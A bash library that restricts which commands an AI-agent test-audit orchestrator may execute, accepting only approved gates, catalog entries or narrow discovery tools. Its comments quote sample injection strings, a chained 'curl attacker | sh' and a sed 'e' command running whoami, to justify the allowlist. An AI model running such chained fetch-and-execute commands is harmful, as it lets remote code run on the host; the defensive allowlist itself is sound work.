#!/usr/bin/env bash
# aid-test-audit-command-allowlist.sh — P066 Step 13.
#
# Enforces, in code, that measure/full execution sources are strictly the
# real target project's execution.yaml gates OR the approved, tracked
# .aid-o/config/test-catalog.yaml — never the gitignored
# test-catalog.proposed.yaml, and never free-form LLM output. The check
# happens in the orchestrator (this script), never inside the LLM-facing
# prompt: an agent's JSON output can *recommend* a command; the
# orchestrator independently resolves it against this allowlist before any
# `bash -c`/`eval`.
#
# NO top-level `set -e`/`set -euo pipefail` — sourced under the caller's own
# strict shell (see aid-test-adapter-contract.sh header convention).

_TACL_LIB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# _tacl_is_static_discovery_command <command_json>
#   `static` mode runs only adapter-declared safe discovery commands:
#   static Bats @test parsing (grep), `git diff --name-only`, and reading
#   package.json (cat/jq). Anything else (including a real test-runner
#   invocation) is rejected — static mode never executes a test.
#
#   Deliberately NARROW, per a real Codex security review of an earlier
#   draft that matched only argv[0]:
#   - shell-type commands are REJECTED OUTRIGHT in static mode, full stop —
#     a shell string can always chain a second command via `;`/`|`/`&&`
#     (e.g. "grep pattern file; curl attacker | sh" would have passed a
#     prefix-match check). static mode's own real, internally-constructed
#     discovery commands are always argv-type; a shell-type "static"
#     candidate is never legitimate.
#   - `sed` and `find` are EXCLUDED from the argv allowlist even though the
#     plan's own prose mentions "grep/sed"-style parsing: GNU sed's `e`
#     command (e.g. `sed -e '1e whoami'`) and `find`'s `-exec` both execute
#     arbitrary commands reachable via ARGUMENTS, not argv[0] — matching
#     only argv[0] would have accepted both. Only tools with no known
#     argument-reachable code-execution escape hatch are kept: grep, cat,
#     jq (none can execute another command via any documented flag), and
#     `git diff` (subcommand-checked, not just argv[0]="git").
_tacl_is_static_discovery_command() {
  local command_json="$1"
  local cmd_type argv0 argv1
  cmd_type="$(jq -r '.type' <<<"$command_json")"
  [[ "$cmd_type" == "argv" ]] || return 1

  argv0="$(jq -r '.argv[0] // empty' <<<"$command_json")"
  argv1="$(jq -r '.argv[1] // empty' <<<"$command_json")"
  case "$argv0" in
    grep|cat|jq) return 0 ;;
    git) [[ "$argv1" == "diff" ]] && return 0 ;;
  esac
  return 1
}

# _tacl_canonical_argv <command_json>
#   The argv a command JSON actually executes as. `{type:"shell", shell:S}` and
#   `{type:"argv", argv:["bash","-c",S]}` are the SAME execution — the second is
#   just the first written out — so the allowlist must see them as the same
#   command.
#
#   This exists because they were not seen as the same, and it made `--mode
#   full` unusable on any project whose expensive units are gates. The profiler
#   reads a gate's shell-form command, rewrites it to argv because that is what
#   it must hand the job supervisor, and then asked the allowlist about the
#   rewritten form — which the gate matcher, comparing `{type:"shell", …}`
#   objects for exact equality, could never approve. Same command, allowed as
#   shell, refused as argv, exit 11, no receipt. Since the selector always picks
#   the most expensive unit and that is always a gate, it failed every time.
#
#   The equivalence does NOT widen what is approved: an argv candidate matches
#   only if some declared gate or approved catalog entry has exactly that shell
#   string, which was already approved in its own right.
_tacl_canonical_argv() {
  jq -c 'if (.argv // []) | length > 0
         then .argv
         else ["bash", "-c", (.shell // "")]
         end' <<<"$1" 2>/dev/null
}

# _tacl_matches_gate_command <command_json> <execution_yaml>
#   True if <command_json> exactly equals (type-aware) a real gate's command
#   in the target project's execution.yaml. Gate commands are always
#   verbatim shell strings (Step 3's declared-command adapter convention) —
#   an argv-type candidate can never match a gate by construction, never
#   partially parsed or tokenized after the fact.
_tacl_matches_gate_command() {
  local command_json="$1" execution_yaml="$2"
  [[ -f "$execution_yaml" ]] || return 1
  command -v yq >/dev/null 2>&1 || return 1
  local gates_json
  gates_json="$(yq -o=json '.gates // {}' "$execution_yaml" 2>/dev/null)" || return 1
  [[ "$gates_json" != "null" ]] || return 1
  local cand; cand="$(_tacl_canonical_argv "$command_json")"
  [[ -n "$cand" ]] || return 1
  jq -e --argjson cand "$cand" '
    any(.[]; ["bash", "-c", .command] == $cand)
  ' <<<"$gates_json" >/dev/null 2>&1
}

# _tacl_matches_approved_catalog_command <command_json> <catalog_path>
#   True if <command_json> exactly equals (type-aware) a run_unit's command
#   in the APPROVED catalog specifically. <catalog_path> MUST be the
#   force-tracked .aid-o/config/test-catalog.yaml — a caller passing the
#   gitignored .aid-o/work/test-audits/*/test-catalog.proposed.yaml here is
#   a caller bug this function has no way to detect from content alone
#   (both are schema-identical); Step 17's own approval boundary is what
#   keeps only the approved path ever reachable from measure/full dispatch.
_tacl_matches_approved_catalog_command() {
  local command_json="$1" catalog_path="$2"
  [[ -f "$catalog_path" ]] || return 1
  local catalog_json
  case "$catalog_path" in
    *.json) catalog_json="$(jq -c '.' "$catalog_path" 2>/dev/null)" || return 1 ;;
    *) catalog_json="$(yq -o=json '.' "$catalog_path" 2>/dev/null)" || return 1 ;;
  esac
  [[ -n "$catalog_json" && "$catalog_json" != "null" ]] || return 1
  local status
  status="$(jq -r '.status // empty' <<<"$catalog_json")"
  [[ "$status" == "approved" ]] || return 1
  local cand; cand="$(_tacl_canonical_argv "$command_json")"
  [[ -n "$cand" ]] || return 1
  jq -e --argjson cand "$cand" '
    any(.run_units[]?;
        (.command | if (.argv // []) | length > 0
                    then .argv
                    else ["bash", "-c", (.shell // "")] end) == $cand)
  ' <<<"$catalog_json" >/dev/null 2>&1
}

# aid_test_audit_check_allowed <mode> <command_json> <execution_yaml> <approved_catalog_path>
#   Returns 0 if <command_json> is allowed to execute under <mode>, 1
#   otherwise (with a named reason on stderr — visible in the audit's own
#   artifacts, never silently dropped).
aid_test_audit_check_allowed() {
  local mode="$1" command_json="$2" execution_yaml="$3" approved_catalog="$4"

  case "$mode" in
    static)
      if _tacl_is_static_discovery_command "$command_json"; then
        return 0
      fi
      echo "aid-test-audit-command-allowlist: rejected — not in static discovery allowlist: $command_json" >&2
      return 1
      ;;
    measure|full)
      if _tacl_matches_gate_command "$command_json" "$execution_yaml"; then
        return 0
      fi
      if _tacl_matches_approved_catalog_command "$command_json" "$approved_catalog"; then
        return 0
      fi
      echo "aid-test-audit-command-allowlist: rejected — not a registered gate and catalog entry not approved: $command_json" >&2
      return 1
      ;;
    *)
      echo "aid-test-audit-command-allowlist: unknown mode '$mode'" >&2
      return 1
      ;;
  esac
}
